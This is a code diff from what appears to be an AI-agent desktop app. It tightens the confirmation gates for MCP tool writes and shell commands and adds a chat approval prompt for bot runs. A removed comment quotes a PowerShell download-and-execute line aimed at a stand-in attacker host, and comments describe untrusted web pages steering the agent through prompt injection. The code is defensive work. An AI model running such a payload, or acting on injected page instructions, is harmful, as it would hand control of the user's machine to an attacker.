@@ -6,6 +6,8 @@ import { sendLog } from '../helpers';
 import { t } from '../i18n';
 import { getMcpRegistry } from '../mcp';
 import type { AgentConfirmRequest, McpConfirmRequest, ShellConfirmRequest } from '../flow/agent/agentEngine';
+import { SHELL_COMMAND_MAX } from '../flow/agent/shellApproval';
+import type { ShellApprovalText } from '../flow/agent/shellApproval';
 import type { FlowWriteConfirmRequest } from '../flow/agent/agentBuiltins';
 import { askRenderer } from './agentConfirmBridge';
 import type { CommandOrigin } from './commandOrigin';
@@ -21,19 +23,21 @@ async function confirmMcpWrite(
   strings: Strings,
   origin: CommandOrigin,
 ): Promise<boolean> {
+  // A bot run has nobody at the desk to ask, so it can only refuse — before "always allow" is even
+  // read. That grant was the desktop user skipping their own dialog; it was never a write permission
+  // for whoever is paired with the bot.
+  if (origin === 'bot') {
+    sendLog(`🔒 [Agent] ${req.serverName}: ${req.toolName} — ${t(strings, 'agent.mcp.confirm.botDenied')}`);
+    return false;
+  }
   // Sending and deleting are asked every time. "Always allow" was granted for edits; it was never a
   // standing permission to mail other people or throw the user's things away.
   if (!req.forceAsk && isWriteAutoApproved(config.mcpServers, req.serverId)) {
     sendLog(`🔓 [Agent] ${req.serverName}: ${req.toolName} — ${t(strings, 'agent.mcp.confirm.autoApproved')}`);
     return true;
   }
-  if (origin === 'bot') {
-    sendLog(`🔒 [Agent] ${req.serverName}: ${req.toolName} — ${t(strings, 'agent.mcp.confirm.botDenied')}`);
-    return false;
-  }
 
-  // A built-in connector is not in config.mcpServers, so "always allow" had nowhere to be saved and
-  // the button silently did nothing. It is hidden instead of pretending.
+  // A built-in connector is not in config.mcpServers, so "always allow" has nowhere to be saved: hide it.
   const allowAlways = !req.forceAsk && !findBuiltinConnector(req.serverId);
   const argsPreview = JSON.stringify(req.args, null, 2);
   const choice = await askRenderer(getMainWin(), {
@@ -68,31 +72,21 @@ async function confirmFlowWrite(
     flowName: req.flowName,
     stepTypes: req.stepTypes,
     sensitiveTypes: req.sensitiveTypes,
+    ...(req.edit ? { edit: req.edit } : {}),
+    ...(req.recipients?.length ? { recipients: req.recipients } : {}),
   });
   return choice !== 'deny';
 }
 
 /**
- * A command longer than this is REFUSED, not clipped.
- *
- * The dialog previously showed `command.slice(0, 2_000)` while the engine ran the whole string,
- * so a 2,050-character action could show a plausible inventory one-liner and execute
- * `; iwr http://attacker/x.ps1 | iex` on the end of it. The user approved a prefix. A gate whose
- * displayed string can differ from the executed one is not a gate — so the two are now the same
- * string, and the only bound left is a refusal the user can see.
+ * A command longer than `SHELL_COMMAND_MAX` is refused, not clipped: the string the user approves
+ * must be exactly the string that runs, or a harmless-looking prefix could hide an appended payload.
  */
-const COMMAND_MAX = 8_000;
 /*
- * EVERY command is asked, every time. There is deliberately no "allow for the rest of this run".
- *
- * That button was built and then removed: it is the only thing that turns one misjudged approval
- * into unlimited execution, and the risk it unlocks is not one the user can see coming. The agent
- * reads untrusted web pages into the same prompt that picks the next command, so the run that
- * earns the blanket and the run that abuses it are the same run. The cost of removing it is extra
- * clicks; the cost of keeping it is unbounded.
- *
- * `approveAlways` is therefore treated as a plain one-time approve if it ever arrives — the dialog
- * does not offer that button for a shell request, and a stray one must not widen anything.
+ * Every command is asked, every time; there is deliberately no "allow for the rest of this run".
+ * The agent reads untrusted pages into the same prompt that picks the next command, so a blanket
+ * approval could be abused by the very run that earned it. A stray `approveAlways` counts as a
+ * one-time approve.
  */
 async function confirmShell(
   req: ShellConfirmRequest,
@@ -104,7 +98,7 @@ async function confirmShell(
     sendLog(`\u{1F512} [Agent] shell — ${t(strings, 'agent.shell.confirm.botDenied')}`);
     return false;
   }
-  if (req.command.length > COMMAND_MAX) {
+  if (req.command.length > SHELL_COMMAND_MAX) {
     sendLog(`\u{1F512} [Agent] shell: refused a ${req.command.length}-character command`);
     return false;
   }
@@ -117,6 +111,28 @@ async function confirmShell(
   });
 
   return choice !== 'deny';
+}
+
+function interpreterLabel(interpreter: string): string {
+  const name = interpreter.split(/[\\/]/).pop() ?? interpreter;
+  if (/^powershell(\.exe)?$/i.test(name)) return 'PowerShell';
+  if (/^cmd(\.exe)?$/i.test(name)) return 'cmd';
+  return name;
+}
+
+/**
+ * The chat question that stands in for the shell dialog on a bot run: the whole command in a code
+ * block whose fence outlasts any backtick run inside it, so no command can close the block early
+ * and dress its tail up as prose.
+ */
+export function shellApprovalText(req: ShellConfirmRequest, strings: Strings): ShellApprovalText {
+  const longestRun = Math.max(0, ...(req.command.match(/`+/g) ?? []).map((run) => run.length));
+  const fence = '`'.repeat(Math.max(3, longestRun + 1));
+  const lead = t(strings, 'agent.shell.approve.question', { shell: interpreterLabel(req.interpreter) });
+  return {
+    question: `${lead}\n\n${fence}\n${req.command}\n${fence}`,
+    choices: [t(strings, 'agent.shell.approve.run'), t(strings, 'agent.shell.approve.cancel')],
+  };
 }
 
 export function buildAgentConfirm(
